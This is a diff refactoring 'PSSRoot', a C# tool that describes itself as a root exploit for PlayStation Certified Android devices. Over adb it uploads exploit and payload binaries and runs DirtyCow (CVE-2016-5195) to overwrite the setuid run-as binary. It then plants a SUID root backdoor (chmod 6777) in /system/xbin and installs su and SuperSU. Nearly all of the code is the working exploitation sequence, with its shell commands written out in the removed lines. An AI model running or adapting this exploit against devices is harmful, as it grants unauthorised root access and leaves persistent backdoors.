@@ -3,291 +3,170 @@
     internal class Program
     {
         private static AdbHelper? adb = null;
-
-        static string ANDROID_TMP_FOLDER    = "/data/local/tmp";
-        static string ANDROID_SUID_BINARY   = "/system/bin/run-as";
-        static string ANDROID_ROOT_BACKDOOR = "/system/xbin/root_backdoor";
-        static string ANDROID_SU_INSTALL    = "/system/xbin/su";
-
-        static string ANDROID_BUSYBOX        = ANDROID_TMP_FOLDER + "/" + "busybox";
-        static string ANDROID_EXPLOIT        = ANDROID_TMP_FOLDER + "/" + "exploit";
-        static string ANDROID_PAYLOAD        = ANDROID_TMP_FOLDER + "/" + "payload";
-        static string ANDROID_SU             = ANDROID_TMP_FOLDER + "/" + "su";
-        static string ANDROID_SUID_BACKUP    = ANDROID_TMP_FOLDER + "/" + "suid";
-
-        static void uploadResource(byte[] data, string filename)
-        {
-            if (adb is null) throw new NullReferenceException("adb is null");
-
-            string resTmpPath = Path.Combine(Path.GetTempPath(), "pssroot", "resource.bin");
-            File.WriteAllBytes(resTmpPath, data);
-            adb.Push(resTmpPath, filename);
-            File.Delete(resTmpPath);
-
-        }
-
-        static void installResource(byte[] data)
-        {
-            if (adb is null) throw new NullReferenceException("adb is null");
-
-            string resTmpPath = Path.Combine(Path.GetTempPath(), "pssroot", "resource.apk");
-            File.WriteAllBytes(resTmpPath, data);
-            adb.Install(resTmpPath);
-            File.Delete(resTmpPath);
-
-        }
+        private static Commands? cmd = null;
 
         static void uploadExploitFiles()
         {
-            Console.WriteLine("[*] Uploading busybox ...");
-            uploadResource(RootResources.busybox, ANDROID_BUSYBOX);
-
-            Console.WriteLine("[*] Uploading exploit ...");
-            uploadResource(RootResources.exploit, ANDROID_EXPLOIT);
-
-            Console.WriteLine("[*] Uploading payload ...");
-            uploadResource(RootResources.payload, ANDROID_PAYLOAD);
-
-            Console.WriteLine("[*] Uploading su ...");
-            uploadResource(RootResources.su, ANDROID_SU);
-
-        }
-
-        static void mountSystemRo()
-        {
             if (adb is null) return;
-            Console.WriteLine("[*] Remounting /system/ as read-only ...");
-            string res = adb.SendShellCmd(ANDROID_BUSYBOX + " mount -o ro,remount /system");
-            //if (!adb.MatchesEmptyOutput(res)) { Console.Error.WriteLine("[*] error mounting /system as read-only: " + res); };
-        }
-        static void mountSystemRw()
-        {
-            if (adb is null) return;
-            Console.WriteLine("[*] Remounting /system/ as read-write ...");
-            string res = adb.SendShellCmd(ANDROID_BUSYBOX + " mount -o rw,remount /system");
-            if (!adb.MatchesEmptyOutput(res)) { throw new Exception("[*] error mounting /system as read-write: " + res); };        
-        }
-        static void exitRootEnvironment()
-        {
-            if (adb is null) return;
-            string res;
-            Console.WriteLine("[*] Exiting root shell ...");
-            do
-            {
-                res = adb.SendShellCmd("exit");
-            }
-            while (res.Contains('#'));
+            Log.Task("Uploading required files ...");
 
-            adb.NotifyShellChanged();
+            adb.UploadExecutable(RootResources.exploit, Constants.ANDROID_EXPLOIT);
+            adb.UploadExecutable(RootResources.payload, Constants.ANDROID_PAYLOAD);
+            adb.UploadExecutable(RootResources.su, Constants.ANDROID_SU_BINARY);
+
         }
 
         static void installTemporyRootBackdoor()
         {
-            if (adb is null) return;
-            string res;
+            if (adb is null || cmd is null) return;
+            
+            Log.Task("Creating temporary root backdoor @ " + Constants.ANDROID_ROOT_BACKDOOR + " ...");
 
-            Console.WriteLine("[*] Creating temporary root backdoor @ " + ANDROID_ROOT_BACKDOOR + " ...");
-            res = adb.SendShellCmd(ANDROID_BUSYBOX + " cp \"" + ANDROID_PAYLOAD + "\" \"" + ANDROID_ROOT_BACKDOOR + "\"");
-            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);
-
-            Console.WriteLine("[*] Changing owner of " + ANDROID_ROOT_BACKDOOR + " to root ...");
-            res = adb.SendShellCmd(ANDROID_BUSYBOX + " chown 0:0 \"" + ANDROID_ROOT_BACKDOOR + "\"");
-            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);
-
-            Console.WriteLine("[*] Setting SUID permission for " + ANDROID_ROOT_BACKDOOR + " ...");
-            res = adb.SendShellCmd(ANDROID_BUSYBOX + " chmod 6777 \"" + ANDROID_ROOT_BACKDOOR + "\"");
-            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);
-
+            cmd.CopyFile(Constants.ANDROID_PAYLOAD, Constants.ANDROID_ROOT_BACKDOOR);
+            cmd.RootChown(Constants.ANDROID_ROOT_BACKDOOR, Constants.ANDROID_UID_ROOT, Constants.ANDROID_UID_ROOT);
+            cmd.RootChmod(Constants.ANDROID_ROOT_BACKDOOR, Constants.ANDROID_MODE_SUID);
 
         }
 
         static void backupSuidBinary()
         {
-            if (adb is null) return;
-            string res;
+            if (adb is null || cmd is null) return;
 
-            Console.WriteLine("[*] Backing up " + ANDROID_SUID_BINARY + " ...");
-            res = adb.Shell(ANDROID_BUSYBOX + " stat \"" + ANDROID_SUID_BACKUP + "\"");
-            if (res.Contains("No such file or directory"))
-            {
-                res = adb.Shell(ANDROID_BUSYBOX + " cp -f \"" + ANDROID_SUID_BINARY + "\" \"" + ANDROID_SUID_BACKUP + "\"");
-                if (res != String.Empty) throw new Exception("[*] failed to backup " + ANDROID_SUID_BACKUP + ": " + res);
-            }
+            Log.Task("Backing up "+Constants.ANDROID_SUID_BINARY+" ...");
+            if (!cmd.FileExists(Constants.ANDROID_SUID_BACKUP))
+                cmd.CopyFile(Constants.ANDROID_SUID_BINARY, Constants.ANDROID_SUID_BACKUP);
             else
-            {
-                Console.WriteLine("[*] Backup already exists...");
-            }
+                Log.Warn("Backup already exists...");
         }
 
         static void runExploitToOverwriteSuidBinary()
         {
-            if (adb is null) return;
-            string res;
+            if (adb is null || cmd is null) return;
+            bool gotRoot = false;
 
+            int i = 0;
             do
             {
-                Console.WriteLine("[*] Running CVE-2016-5195 ...");
-                res = adb.Shell(ANDROID_EXPLOIT + " \"" + ANDROID_PAYLOAD + "\" \"" + ANDROID_SUID_BINARY + "\" --no-pad");
+                Log.Task("Attempt exploit #" + i.ToString() + " (this may take a bit) ...");
 
-                Console.WriteLine("[*] Running overwritten suid binary ...");
-                res = adb.SendShellCmd(ANDROID_SUID_BINARY);
-                if (!res.Contains('#')) Console.Error.WriteLine("[*] suid: unexpected output: " + res + " ...");
+                // DirtyCow or CVE-2016-5195 allows you to overwrite any file, so we overwrite a suid binary.
+                cmd.RunExploit(Constants.ANDROID_PAYLOAD, Constants.ANDROID_SUID_BINARY);
+
+                // Attempt to run the suid binary and see if we got root.
+                gotRoot = cmd.EnterRootEnvironment(Constants.ANDROID_SUID_BINARY);
             }
-            while (!res.Contains('#')); // retry until get root shell (sometimes what it writes is corrupted.)
-
-            adb.NotifyShellChanged();
+            while (!gotRoot); // retry until get root shell (sometimes what it writes is corrupted.)
         }
 
-        static void switchFromRunAsToRootBackdoor()
+        static void switchFromSuidToRootBackdoor()
         {
-            if (adb is null) return;
-            string res;
+            if (cmd is null) return;
+            Log.Task("Switching from " + Constants.ANDROID_SUID_BINARY + " to " + Constants.ANDROID_ROOT_BACKDOOR + " ...");
 
             // exit current root environment ...
-            exitRootEnvironment();
+            cmd.ExitRootEnvironment();
 
             // enter root backdoor ...
-            Console.WriteLine("[*] Entering " + ANDROID_ROOT_BACKDOOR + " ...");
-            res = adb.SendShellCmd(ANDROID_ROOT_BACKDOOR);
-            if (!res.Contains("#")) throw new Exception("[*] error getting root shell: " + res);
+            if (!cmd.EnterRootEnvironment(Constants.ANDROID_ROOT_BACKDOOR)) throw new Exception("unable to enter root backdoor.");
 
-            adb.NotifyShellChanged();
         }
 
         static void restoreOriginalSuidBinary()
         {
-            if (adb is null) return;
-            string res;
+            if (cmd is null) return;
 
-            Console.WriteLine("[*] Restoring " + ANDROID_SUID_BINARY + " ...");
-            res = adb.SendShellCmd(ANDROID_BUSYBOX + " cat \"" + ANDROID_SUID_BACKUP + "\" > " + ANDROID_SUID_BINARY);
-            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] error restoring original "+ANDROID_SUID_BINARY+": " + res);
+            Log.Task("Restoring the original " + Constants.ANDROID_SUID_BINARY + " file ...");
+            cmd.RootCatOverwriteFile(Constants.ANDROID_SUID_BACKUP, Constants.ANDROID_SUID_BINARY);
         }
 
-        static void removeBusyBox()
-        {
-            if (adb is null) return;
-
-            string res;
-            Console.WriteLine("[*] Removing " + ANDROID_BUSYBOX + " ...");
-            res = adb.Shell(ANDROID_BUSYBOX + " rm -f " + ANDROID_BUSYBOX);
-            if (res != String.Empty) throw new Exception("[*] rm failed: " + res);
-        }
         static void installSuBinary()
         {
-            if (adb is null) return;
-            string res;
+            if (cmd is null || adb is null) return;
 
-            Console.WriteLine("[*] Copying " + ANDROID_SU + " to " + ANDROID_SU_INSTALL + " ...");
-            res = adb.SendShellCmd(ANDROID_BUSYBOX + " cp -f \"" + ANDROID_SU + "\" \"" + ANDROID_SU_INSTALL + "\"");
-            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);
+            Log.Task("Installing SU binary ...");
 
-            Console.WriteLine("[*] Setting owner of " + ANDROID_SU_INSTALL + " to root ...");
-            res = adb.SendShellCmd(ANDROID_BUSYBOX + " chown 0:0  \"" + ANDROID_SU_INSTALL + "\"");
-            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);
+            cmd.CopyFile(Constants.ANDROID_SU_BINARY, Constants.ANDROID_SU_INSTALL);
 
-            Console.WriteLine("[*] Setting SUID bit on " + ANDROID_SU_INSTALL + " ...");
-            res = adb.SendShellCmd(ANDROID_BUSYBOX + " chmod 6755  \"" + ANDROID_SU_INSTALL + "\"");
-            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);
+            cmd.RootChown(Constants.ANDROID_SU_INSTALL, Constants.ANDROID_UID_ROOT, Constants.ANDROID_UID_ROOT);
+            cmd.RootChmod(Constants.ANDROID_SU_INSTALL, Constants.ANDROID_MODE_SUID);
 
-            Console.WriteLine("[*] Running su install ...");
-            res = adb.SendShellCmd(ANDROID_SU_INSTALL+" --install");
-            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);
+            cmd.RootSuInstall();
+            cmd.RootSuDaemon();
 
-            Console.WriteLine("[*] Running su daemon ...");
-            res = adb.SendShellCmd(ANDROID_SU_INSTALL+" --daemon");
-            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);
-
-            Console.WriteLine("[*] Installing SuperSU.apk ...");
-            installResource(RootResources.supersu);
+            Log.Task("Installing SuperSU.apk ...");
+            adb.InstallApk(RootResources.supersu);
 
 
         }
 
         static void cleanup()
         {
-            if (adb is null) return;
-            string res;
+            if (adb is null || cmd is null) return;
+            
+            Log.Task("Cleaning up temporary files ...");
 
-            Console.WriteLine("[*] Removing temporary root backdoor " + ANDROID_ROOT_BACKDOOR + " ...");
-            res = adb.SendShellCmd(ANDROID_BUSYBOX + " rm -f \"" + ANDROID_ROOT_BACKDOOR + "\"");
-            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);
-
-            Console.WriteLine("[*] Removing " + ANDROID_SU + " ...");
-            res = adb.Shell(ANDROID_BUSYBOX + " rm -f " + ANDROID_SU);
-            if (res != String.Empty) throw new Exception("[*] rm failed: " + res);
-
-            Console.WriteLine("[*] Removing " + ANDROID_EXPLOIT + " ...");
-            res = adb.Shell(ANDROID_BUSYBOX + " rm -f " + ANDROID_EXPLOIT);
-            if (res != String.Empty) throw new Exception("[*] rm failed: " + res);
-
-            Console.WriteLine("[*] Removing " + ANDROID_PAYLOAD + " ...");
-            res = adb.Shell(ANDROID_BUSYBOX + " rm -f " + ANDROID_PAYLOAD);
-            if (res != String.Empty) throw new Exception("[*] rm failed: " + res);
-
-            Console.WriteLine("[*] Removing " + ANDROID_SUID_BACKUP + " ...");
-            res = adb.Shell(ANDROID_BUSYBOX + " rm -f " + ANDROID_SUID_BACKUP);
-            if (res != String.Empty) throw new Exception("[*] rm failed: " + res);
+            cmd.RemoveFile(Constants.ANDROID_ROOT_BACKDOOR);
+            cmd.RemoveFile(Constants.ANDROID_SU_BINARY);
+            cmd.RemoveFile(Constants.ANDROID_EXPLOIT);
+            cmd.RemoveFile(Constants.ANDROID_PAYLOAD);
+            cmd.RemoveFile(Constants.ANDROID_SUID_BACKUP);
 
         }
         static void Main(string[] args)
         {
-            Console.WriteLine("[*] PSSRoot v1.0 by LiEnby ...");
-            Console.WriteLine("[*] Root exploit for PlayStation Certified Devices!");
+            Log.Info("PSSRoot v1.1 by LiEnby ...");
+            Log.Info("Root exploit for PlayStation Certified Devices!");
 
             try
             {
-                string res;
 
                 using (adb = new AdbHelper())
                 {
-                    
-                    // upload required files to device
-                    uploadExploitFiles();
+                    using (cmd = new Commands(adb, RootResources.busybox))
+                    {
 
-                    // backup suid binaries ...
-                    backupSuidBinary();
+                        // upload required files to device
+                        uploadExploitFiles();
 
-                    // get root shell via overwrtiing suid binary
-                    runExploitToOverwriteSuidBinary();
+                        // backup suid binaries ...
+                        backupSuidBinary();
 
-                    // mount /system as read-write
-                    mountSystemRw();
+                        // get root shell via overwrtiing suid binary
+                        runExploitToOverwriteSuidBinary();
 
-                    // install temporary root backdoor ...
-                    installTemporyRootBackdoor();
+                        // mount /system as read-write
+                        cmd.RootRemountRw(Constants.ANDROID_SYSTEM_DIR);
 
-                    // switch from 'run-as' overwritten by exploit, to root backdoor ..
-                    switchFromRunAsToRootBackdoor();
+                        // install temporary root backdoor ...
+                        installTemporyRootBackdoor();
 
-                    // cleanup: restore original suid binary... 
-                    restoreOriginalSuidBinary();
+                        // switch from 'run-as' overwritten by exploit, to root backdoor ..
+                        switchFromSuidToRootBackdoor();
 
-                    // install the 'su' binary file ...
-                    installSuBinary();
+                        // cleanup: restore original suid binary... 
+                        restoreOriginalSuidBinary();
 
-                    // cleanup any files related to the exploitation process.
-                    cleanup();
+                        // install the 'su' binary file ...
+                        installSuBinary();
 
-                    // remount /system as read-only ..
-                    mountSystemRo();
+                        // cleanup any files related to the exploitation process.
+                        cleanup();
 
-                    // exit root shell
-                    exitRootEnvironment();
+                        // remount /system as read-only ..
+                        cmd.RootRemountRo(Constants.ANDROID_SYSTEM_DIR);
+                    }
 
-                    // finally remove busybox binary
-                    removeBusyBox();
                 }
 
-                Console.WriteLine("[*] Cleaning up pssroot temporary folder");
-                Directory.Delete(Path.Combine(Path.GetTempPath(), "pssroot"), true);
+                Log.Info("Done, launch SuperSU and click the \"Normal\" option when prompted to update");
 
-                Console.WriteLine("[*] Done, launch SuperSU and click the \"Normal\" option when prompted to update");
-                Thread.Sleep(5000);
+                Log.Info("Press any key to exit ...");
+                Console.ReadKey();
             }
             catch (Exception e)
             {
-                Console.Error.WriteLine(e.Message);
+                Log.Error(e.Message);
+                Log.Info("Press any key to exit ...");
                 Console.ReadKey();
             }
 
